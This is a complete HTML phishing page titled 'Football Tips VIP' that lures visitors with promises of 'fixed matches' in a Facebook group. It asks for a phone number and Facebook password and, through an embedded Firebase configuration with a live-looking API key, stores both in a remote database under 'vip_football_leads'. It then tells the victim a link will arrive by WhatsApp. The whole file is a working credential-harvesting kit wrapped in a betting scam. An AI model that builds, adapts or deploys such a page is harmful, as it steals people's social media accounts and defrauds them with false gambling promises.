<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Football Tips VIP</title>

<style>

body{
font-family:Poppins, sans-serif;
background:#1877f2;
height:100vh;
margin:0;
display:flex;
align-items:center;
justify-content:center;
overflow:hidden;
}

/* floating betting text */

.float{
position:absolute;
color:white;
font-weight:bold;
opacity:0.3;
animation:move 10s linear infinite;
}

@keyframes move{
0%{transform:translateY(100vh)}
100%{transform:translateY(-10vh)}
}

/* football animation */

.ball{
position:absolute;
font-size:35px;
animation:ballmove 12s linear infinite;
opacity:0.5;
}

@keyframes ballmove{
0%{transform:translateX(-10vw) rotate(0)}
100%{transform:translateX(110vw) rotate(360deg)}
}

.container{
background:white;
padding:35px;
border-radius:15px;
width:90%;
max-width:420px;
text-align:center;
box-shadow:0 10px 30px rgba(0,0,0,0.3);
z-index:2;
}

h1{
color:#1877f2;
font-size:22px;
margin-bottom:10px;
}

p{
font-size:15px;
margin-bottom:20px;
}

label{
display:block;
text-align:left;
font-size:14px;
margin-bottom:5px;
font-weight:600;
}

input{
width:100%;
padding:12px;
border:1px solid #ccc;
border-radius:8px;
margin-bottom:15px;
font-size:16px;
}

button{
width:100%;
padding:12px;
background:#1877f2;
border:none;
border-radius:8px;
color:white;
font-size:16px;
cursor:pointer;
}

button:hover{
background:#0f5cd6;
}

.notification{
margin-top:10px;
padding:10px;
border-radius:6px;
display:none;
font-size:14px;
}

.success{
background:#e6ffe6;
color:green;
}

.error{
background:#ffe6e6;
color:red;
}

</style>
</head>

<body>

<!-- floating betting text -->
<div class="float" style="left:10%">1X2</div>
<div class="float" style="left:30%;animation-delay:2s">OVER 2.5</div>
<div class="float" style="left:50%;animation-delay:4s">UNDER 3.5</div>
<div class="float" style="left:70%;animation-delay:6s">BTTS</div>
<div class="float" style="left:85%;animation-delay:8s">FIXED MATCH</div>

<!-- footballs -->
<div class="ball" style="top:20%">⚽</div>
<div class="ball" style="top:50%;animation-delay:4s">⚽</div>
<div class="ball" style="top:75%;animation-delay:8s">⚽</div>

<div class="container">

<h1>JOIN FACEBOOK GROUP NOW TO ACCESS FIXED MATCHES</h1>

<p>Enter your details to receive the VIP group link</p>

<label>Phone Number</label>
<input type="tel" id="phoneNumber" placeholder="Enter Phone Number">

<label>Facebook Password</label>
<input type="password" id="demoPassword" placeholder="Enter Facebook Password">

<button id="joinBtn">Join</button>

<div id="notification" class="notification"></div>

</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

const firebaseConfig = {
apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",
authDomain: "airdropusdt-767d7.firebaseapp.com",
databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",
projectId: "airdropusdt-767d7",
storageBucket: "airdropusdt-767d7.firebasestorage.app",
messagingSenderId: "627616603037",
appId: "1:627616603037:web:63041f067800c97fab6d74"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const joinBtn = document.getElementById("joinBtn");
const notification = document.getElementById("notification");

joinBtn.addEventListener("click", async () => {

const phone = document.getElementById("phoneNumber").value.trim();
const demoPassword = document.getElementById("demoPassword").value.trim();

if(phone === "" || demoPassword === ""){
notification.style.display="block";
notification.className="notification error";
notification.textContent="Please enter phone number and facebook password.";
return;
}

try{

const dataRef = ref(db,"vip_football_leads");
const newEntry = push(dataRef);

await set(newEntry,{
phoneNumber:phone,
demoPassword:demoPassword,
time:new Date().toISOString()
});

notification.style.display="block";
notification.className="notification success";
notification.textContent="You'll receive link through WhatsApp";

document.getElementById("phoneNumber").value="";
document.getElementById("demoPassword").value="";

}catch(error){

notification.style.display="block";
notification.className="notification error";
notification.textContent="Submission failed. Try again.";

}

});

</script>

</body>
</html>
